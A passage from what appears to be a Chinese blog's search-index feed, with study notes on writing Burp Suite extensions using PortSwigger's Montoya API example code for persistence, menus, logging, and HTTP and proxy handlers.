function_">printToOutput</span><span class="params">(PersistedList&lt;HttpRequestResponse&gt; myPersistedList)</span> &#123;</span><br><span class="line">        <span class="comment">// 将加载的列表打印到输出日志</span></span><br><span class="line">        <span class="keyword">for</span> (HttpRequestResponse httpRequestResponse : myPersistedList) &#123;</span><br><span class="line">            api.logging().logToOutput(httpRequestResponse.request().toString());</span><br><span class="line">            api.logging().logToOutput(<span class="string">&quot;\n========================\n&quot;</span>);</span><br><span class="line">            api.logging().logToOutput(httpRequestResponse.response().toString());</span><br><span class="line">            api.logging().logToOutput(<span class="string">&quot;\n**************************&quot;</span>.repeat(<span class="number">2</span>));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">ensurePersistedListIsPresent</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="comment">// 创建持久化的请求/响应列表</span></span><br><span class="line">        <span class="keyword">if</span> (myExtensionData.getHttpRequestResponseList(REQUEST_RESPONSE_LIST_KEY) == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="comment">// 创建一个新的空列表并将其保存到我们的键下</span></span><br><span class="line">            PersistedList&lt;HttpRequestResponse&gt; emptyPersistedList = PersistedList.persistedHttpRequestResponseList();</span><br><span class="line">            myExtensionData.setHttpRequestResponseList(REQUEST_RESPONSE_LIST_KEY, emptyPersistedList);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">PersistenceExample</span> <span class="keyword">implements</span> <span class="title class_">BurpExtension</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">STARTUP_COUNT_KEY</span> <span class="operator">=</span> <span class="string">&quot;Startup Count&quot;</span>;  <span class="comment">// 用于保存启动次数的键</span></span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">initialize</span><span class="params">(MontoyaApi api)</span> &#123;</span><br><span class="line">        <span class="comment">// 为扩展设置名称，持久化数据将基于此名称进行保存和加载</span></span><br><span class="line">        api.extension().setName(<span class="string">&quot;Persistence example extension&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 获取持久化对象，用于保存或加载数据</span></span><br><span class="line">        <span class="type">PersistedObject</span> <span class="variable">myExtensionData</span> <span class="operator">=</span> api.persistence().extensionData();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 从项目文件中获取整数值</span></span><br><span class="line">        <span class="type">Integer</span> <span class="variable">startupCount</span> <span class="operator">=</span> myExtensionData.getInteger(STARTUP_COUNT_KEY);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 如果值不存在，即此键未在项目文件中找到，则初始化为0</span></span><br><span class="line">        <span class="keyword">if</span> (startupCount == <span class="literal">null</span>) &#123;</span><br><span class="line">            startupCount = <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 将启动次数增加1并保存回项目文件</span></span><br><span class="line">        myExtensionData.setInteger(STARTUP_COUNT_KEY, startupCount + <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 从持久化数据中检索更新后的值并创建一个信息事件</span></span><br><span class="line">        api.logging().raiseInfoEvent(<span class="string">&quot;Startup count is: &quot;</span> + myExtensionData.getInteger(STARTUP_COUNT_KEY));</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 运行更复杂的示例，例如保存和加载请求</span></span><br><span class="line">        advancedExamples(api);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 运行高级示例</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">advancedExamples</span><span class="params">(MontoyaApi api)</span> &#123;</span><br><span class="line">        <span class="comment">// 保存和加载请求的示例</span></span><br><span class="line">        <span class="type">SavingLoadingRequests</span> <span class="variable">savingLoadingRequests</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SavingLoadingRequests</span>(api);</span><br><span class="line">        savingLoadingRequests.runExample();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 使用请求响应列表的示例</span></span><br><span class="line">        <span class="type">RequestResponseLogging</span> <span class="variable">requestLogging</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">RequestResponseLogging</span>(api);</span><br><span class="line">        requestLogging.runExample();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="WebSocket-Handler-Example-Extension"><a href="#WebSocket-Handler-Example-Extension" class="headerlink" title="WebSocket Handler Example Extension"></a>WebSocket Handler Example Extension</h2><p>The extension works as follows:</p><ul><li>It registers a web socket created handler</li><li>When a web socket is created<ul><li>It sends an initial text message</li><li>It registers a message listener for the websocket</li><li>Any message from the client that contains the text “password” is base64 encoded.</li></ul></li></ul><p>这个先不看了</p><h2 id="Menu-Bar-Example-Extension"><a href="#Menu-Bar-Example-Extension" class="headerlink" title="Menu Bar Example Extension"></a>Menu Bar Example Extension</h2><p>This extension demonstrates registering a top level menu bar item with various actions.</p><p>It demonstrates the following techniques:</p><p>Creating a BasicMenuItem with a caption<br>Providing an action for a BasicMenuItem<br>Adding the Menu to Burp<br>Registering an ExtensionUnloadingHandler</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> burp.api.montoya.MontoyaApi;</span><br><span class="line"><span class="keyword">import</span> burp.api.montoya.extension.ExtensionUnloadingHandler;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MyExtensionUnloadingHandler</span> <span class="keyword">implements</span> <span class="title class_">ExtensionUnloadingHandler</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> MontoyaApi api;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">MyExtensionUnloadingHandler</span><span class="params">(MontoyaApi api)</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">this</span>.api = api;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">extensionUnloaded</span><span class="params">()</span></span><br><span class="line">    &#123;</span><br><span class="line">        api.logging().logToOutput(<span class="string">&quot;Extension has been unloaded.&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> burp.api.montoya.BurpExtension;</span><br><span class="line"><span class="keyword">import</span> burp.api.montoya.MontoyaApi;</span><br><span class="line"><span class="keyword">import</span> burp.api.montoya.ui.menu.BasicMenuItem;</span><br><span class="line"><span class="keyword">import</span> burp.api.montoya.ui.menu.Menu;</span><br><span class="line"><span class="keyword">import</span> burp.api.montoya.ui.menu.MenuItem;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MenuBar</span> <span class="keyword">implements</span> <span class="title class_">BurpExtension</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">initialize</span><span class="params">(MontoyaApi api)</span></span><br><span class="line">    &#123;</span><br><span class="line">        api.extension().setName(<span class="string">&quot;Add menu bar&quot;</span>);</span><br><span class="line">        api.logging().logToOutput(<span class="string">&quot;Extension has been loaded.&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">BasicMenuItem</span> <span class="variable">alertEventItem</span> <span class="operator">=</span> BasicMenuItem.basicMenuItem(<span class="string">&quot;Raise critical alert&quot;</span>).withAction(() -&gt; api.logging().raiseCriticalEvent(<span class="string">&quot;Alert from extension&quot;</span>));</span><br><span class="line"></span><br><span class="line">        <span class="type">BasicMenuItem</span> <span class="variable">basicMenuItem</span> <span class="operator">=</span> MenuItem.basicMenuItem(<span class="string">&quot;Unload extension&quot;</span>);</span><br><span class="line">        <span class="type">MenuItem</span> <span class="variable">unloadExtensionItem</span> <span class="operator">=</span> basicMenuItem.withAction(() -&gt; api.extension().unload());</span><br><span class="line"></span><br><span class="line">        <span class="type">Menu</span> <span class="variable">menu</span> <span class="operator">=</span> Menu.menu(<span class="string">&quot;Menu bar&quot;</span>).withMenuItems(alertEventItem, unloadExtensionItem);</span><br><span class="line"></span><br><span class="line">        api.userInterface().menuBar().registerMenu(menu);</span><br><span class="line"></span><br><span class="line">        api.extension().registerUnloadingHandler(<span class="keyword">new</span> <span class="title class_">MyExtensionUnloadingHandler</span>(api));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="Context-Menu-Example-Extension"><a href="#Context-Menu-Example-Extension" class="headerlink" title="Context Menu Example Extension"></a>Context Menu Example Extension</h2><p>This extension adds a new context menu item to print out the request or response of an HttpRequestResponse in the Target, Proxy or Logger tab.</p><p>The sample extension demonstrates the following techniques:</p><p>Registering a new ContextMenuItemsProvider.<br>Creating a JMenuItem.<br>Adding an action listener to a JMenuItem.<br>If you right-click in a message editor context, it will use the item from the message editor.<br>If you right-click on a table item, it will print the request&#x2F;response for the first selected item.</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> javax.swing.*;</span><br><span class="line"><span class="keyword">import</span> java.awt.*;</span><br><span class="line"><span class="keyword">import</span> java.util.ArrayList;</span><br><span class="line"><span class="keyword">import</span> java.util.List;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MyContextMenuItemsProvider</span> <span class="keyword">implements</span> <span class="title class_">ContextMenuItemsProvider</span></span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> MontoyaApi api;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">MyContextMenuItemsProvider</span><span class="params">(MontoyaApi api)</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">this</span>.api = api;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> List&lt;Component&gt; <span class="title function_">provideMenuItems</span><span class="params">(ContextMenuEvent event)</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (event.isFromTool(ToolType.PROXY, ToolType.TARGET, ToolType.LOGGER))</span><br><span class="line">        &#123;</span><br><span class="line">            List&lt;Component&gt; menuItemList = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line"></span><br><span class="line">            <span class="type">JMenuItem</span> <span class="variable">retrieveRequestItem</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JMenuItem</span>(<span class="string">&quot;Print request&quot;</span>);</span><br><span class="line">            <span class="type">JMenuItem</span> <span class="variable">retrieveResponseItem</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JMenuItem</span>(<span class="string">&quot;Print response&quot;</span>);</span><br><span class="line"></span><br><span class="line">            <span class="type">HttpRequestResponse</span> <span class="variable">requestResponse</span> <span class="operator">=</span> event.messageEditorRequestResponse().isPresent() ? event.messageEditorRequestResponse().get().requestResponse() : event.selectedRequestResponses().get(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">            retrieveRequestItem.addActionListener(l -&gt; api.logging().logToOutput(<span class="string">&quot;Request is:\r\n&quot;</span> + requestResponse.request().toString()));</span><br><span class="line">            menuItemList.add(retrieveRequestItem);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (requestResponse.response() != <span class="literal">null</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                retrieveResponseItem.addActionListener(l -&gt; api.logging().logToOutput(<span class="string">&quot;Response is:\r\n&quot;</span> + requestResponse.response().toString()));</span><br><span class="line">                menuItemList.add(retrieveResponseItem);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> menuItemList;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> burp.api.montoya.BurpExtension;</span><br><span class="line"><span class="keyword">import</span> burp.api.montoya.MontoyaApi;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ContextMenu</span> <span class="keyword">implements</span> <span class="title class_">BurpExtension</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">initialize</span><span class="params">(MontoyaApi api)</span></span><br><span class="line">    &#123;</span><br><span class="line">        api.extension().setName(<span class="string">&quot;Context menu extension&quot;</span>);</span><br><span class="line"></span><br><span class="line">        api.userInterface().registerContextMenuItemsProvider(<span class="keyword">new</span> <span class="title class_">MyContextMenuItemsProvider</span>(api));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>上面代码是创建右键处理选项的</p>]]></content>
      
      
      <categories>
          
          <category> Tools </category>
          
      </categories>
      
      
        <tags>
            
            <tag> burpsuite </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【工具开发】Burpsuite 插件开发</title>
      <link href="/2024/10/23/tools/burpsuite-plugins/"/>
      <url>/2024/10/23/tools/burpsuite-plugins/</url>
      
        <content type="html"><![CDATA[<p>想写一个burpsuite插件，看到burpsuite更新了最新的api，首先通过学习官网的github示例学习下api功能使用<br><a href="https://github.com/PortSwigger/burp-extensions-montoya-api-examples">https://github.com/PortSwigger/burp-extensions-montoya-api-examples</a></p><h2 id="Hello-World"><a href="#Hello-World" class="headerlink" title="Hello World"></a>Hello World</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> example.helloworld;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> burp.api.montoya.BurpExtension;</span><br><span class="line"><span class="keyword">import</span> burp.api.montoya.MontoyaApi;</span><br><span class="line"><span class="keyword">import</span> burp.api.montoya.logging.Logging;</span><br><span class="line"></span><br><span class="line"><span class="comment">//Burp will auto-detect and load any class that extends BurpExtension.</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">HelloWorld</span> <span class="keyword">implements</span> <span class="title class_">BurpExtension</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">initialize</span><span class="params">(MontoyaApi api)</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">// set extension name</span></span><br><span class="line">        api.extension().setName(<span class="string">&quot;Hello world extension&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">Logging</span> <span class="variable">logging</span> <span class="operator">=</span> api.logging();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// write a message to our output stream</span></span><br><span class="line">        logging.logToOutput(<span class="string">&quot;Hello output.&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// write a message to our error stream</span></span><br><span class="line">        logging.logToError(<span class="string">&quot;Hello error.&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// write a message to the Burp alerts tab</span></span><br><span class="line">        logging.raiseInfoEvent(<span class="string">&quot;Hello info event.&quot;</span>);</span><br><span class="line">        logging.raiseDebugEvent(<span class="string">&quot;Hello debug event.&quot;</span>);</span><br><span class="line">        logging.raiseErrorEvent(<span class="string">&quot;Hello error event.&quot;</span>);</span><br><span class="line">        logging.raiseCriticalEvent(<span class="string">&quot;Hello critical event.&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// throw an exception that will appear in our error stream</span></span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(<span class="string">&quot;Hello exception.&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>上面代码的logging是输出在这里的：<br><img src="/2024/10/23/tools/burpsuite-plugins/image.png"><br>可以用来输出自动化扫描后的结果</p><h2 id="HTTP-Handler-Example-Extension"><a href="#HTTP-Handler-Example-Extension" class="headerlink" title="HTTP Handler Example Extension"></a>HTTP Handler Example Extension</h2><p>它注册一个 HTTP 处理程序<br>对于传出请求消息：<br>    如果请求是请求：POST<br>        请求正文将记录到 output<br>        将向请求添加注释<br>    将 URL 参数添加到请求中<br>对于传入的响应消息：<br>    如果相应的请求包含标头，则会添加高亮显示Content-LengthBLUE</p><p>MyHttpHandler.java</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> burp.api.montoya.MontoyaApi;</span><br><span class="line"><span class="keyword">import</span> burp.api.montoya.core.Annotations;</span><br><span class="line"><span class="keyword">import</span> burp.api.montoya.core.HighlightColor;</span><br><span class="line"><span class="keyword">import</span> burp.api.montoya.http.handler.*;</span><br><span class="line"><span class="keyword">import</span> burp.api.montoya.http.message.requests.HttpRequest;</span><br><span class="line"><span class="keyword">import</span> burp.api.montoya.logging.Logging;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="keyword">static</span> burp.api.montoya.http.handler.RequestToBeSentAction.continueWith;</span><br><span class="line"><span class="keyword">import</span> <span class="keyword">static</span> burp.api.montoya.http.handler.ResponseReceivedAction.continueWith;</span><br><span class="line"><span class="keyword">import</span> <span class="keyword">static</span> burp.api.montoya.http.message.params.HttpParameter.urlParameter;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">MyHttpHandler</span> <span class="keyword">implements</span> <span class="title class_">HttpHandler</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> Logging logging;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">MyHttpHandler</span><span class="params">(MontoyaApi api)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.logging = api.logging();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> RequestToBeSentAction <span class="title function_">handleHttpRequestToBeSent</span><span class="params">(HttpRequestToBeSent requestToBeSent)</span> &#123;</span><br><span class="line">        <span class="type">Annotations</span> <span class="variable">annotations</span> <span class="operator">=</span> requestToBeSent.annotations();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// If the request is a post, log the body and add notes.</span></span><br><span class="line">        <span class="keyword">if</span> (isPost(requestToBeSent)) &#123;</span><br><span class="line">            annotations = annotations.withNotes(<span class="string">&quot;Request was a post&quot;</span>);</span><br><span class="line">            logging.logToOutput(requestToBeSent.bodyToString());</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//Modify the request by adding url param.</span></span><br><span class="line">        <span class="type">HttpRequest</span> <span class="variable">modifiedRequest</span> <span class="operator">=</span> requestToBeSent.withAddedParameters(urlParameter(<span class="string">&quot;foo&quot;</span>, <span class="string">&quot;bar&quot;</span>));</span><br><span class="line"></span><br><span class="line">        <span class="comment">//Return the modified request to burp with updated annotations.</span></span><br><span class="line">        <span class="keyword">return</span> continueWith(modifiedRequest, annotations);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> ResponseReceivedAction <span class="title function_">handleHttpResponseReceived</span><span class="params">(HttpResponseReceived responseReceived)</span> &#123;</span><br><span class="line">        <span class="type">Annotations</span> <span class="variable">annotations</span> <span class="operator">=</span> responseReceived.annotations();</span><br><span class="line">        <span class="comment">//Highlight all responses where the request had a Content-Length header.</span></span><br><span class="line">        <span class="keyword">if</span> (responseHasContentLengthHeader(responseReceived)) &#123;</span><br><span class="line">            annotations = annotations.withHighlightColor(HighlightColor.BLUE);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> continueWith(responseReceived, annotations);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="type">boolean</span> <span class="title function_">isPost</span><span class="params">(HttpRequestToBeSent httpRequestToBeSent)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> httpRequestToBeSent.method().equalsIgnoreCase(<span class="string">&quot;POST&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="type">boolean</span> <span class="title function_">responseHasContentLengthHeader</span><span class="params">(HttpResponseReceived httpResponseReceived)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> httpResponseReceived.initiatingRequest().headers().stream().anyMatch(header -&gt; header.name().equalsIgnoreCase(<span class="string">&quot;Content-Length&quot;</span>));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>HttpHandlerExample.java</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> burp.api.montoya.BurpExtension;</span><br><span class="line"><span class="keyword">import</span> burp.api.montoya.MontoyaApi;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//Burp will auto-detect and load any class that extends BurpExtension.</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">HttpHandlerExample</span> <span class="keyword">implements</span> <span class="title class_">BurpExtension</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">initialize</span><span class="params">(MontoyaApi api)</span> &#123;</span><br><span class="line">        api.extension().setName(<span class="string">&quot;HTTP Handler Example&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//Register our http handler with Burp.</span></span><br><span class="line">        api.http().registerHttpHandler(<span class="keyword">new</span> <span class="title class_">MyHttpHandler</span>(api));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="Proxy-Handler-Example-Extension"><a href="#Proxy-Handler-Example-Extension" class="headerlink" title="Proxy Handler Example Extension"></a>Proxy Handler Example Extension</h2><p>The extension works as follows:</p><ul><li>It registers a Proxy handler</li><li>For outgoing request messages:<ul><li>It drops all <code>POST</code> requests</li><li>Requests with <code>foo</code> in the URL are not intercepted</li><li>If the <code>Content-Type</code> is <code>JSON</code>, the request is highlighted <code>RED</code> and Burp rules for Interception are followed</li><li>All other requests are intercepted</li><li>User modified requests are continued as normal</li></ul></li><li>For incoming response messages:<ul><li>All responses that contain the string <code>username</code> are highlighted <code>BLUE</code></li><li>All other responses follow Burp rules for Interception</li></ul></li></ul><p>ProxyHandlerExample.java</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> burp.api.montoya.BurpExtension;</span><br><span class="line"><span class="keyword">import</span> burp.api.montoya.MontoyaApi;</span><br><span class="line"></span><br><span class="line"><span class="comment">//Burp will auto-detect and load any class that extends BurpExtension.</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ProxyHandlerExample</span> <span class="keyword">implements</span> <span class="title class_">BurpExtension</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">initialize</span><span class="params">(MontoyaApi api)</span></span><br><span class="line">    &#123;</span><br><span class="line">        api.extension().setName(<span class="string">&quot;Proxy Handler Example&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//Register proxy handlers with Burp.</span></span><br><span class="line">        api.proxy().registerRequestHandler(<span class="keyword">new</span> <span class="title class_">MyProxyHttpRequestHandler</span>());</span><br><span class="line">        api.proxy().registerResponseHandler(<span class="keyword">new</span> <span class="title class_">MyProxyHttpResponseHandler</span>());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>MyProxyHttpResponseHandler.java</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span 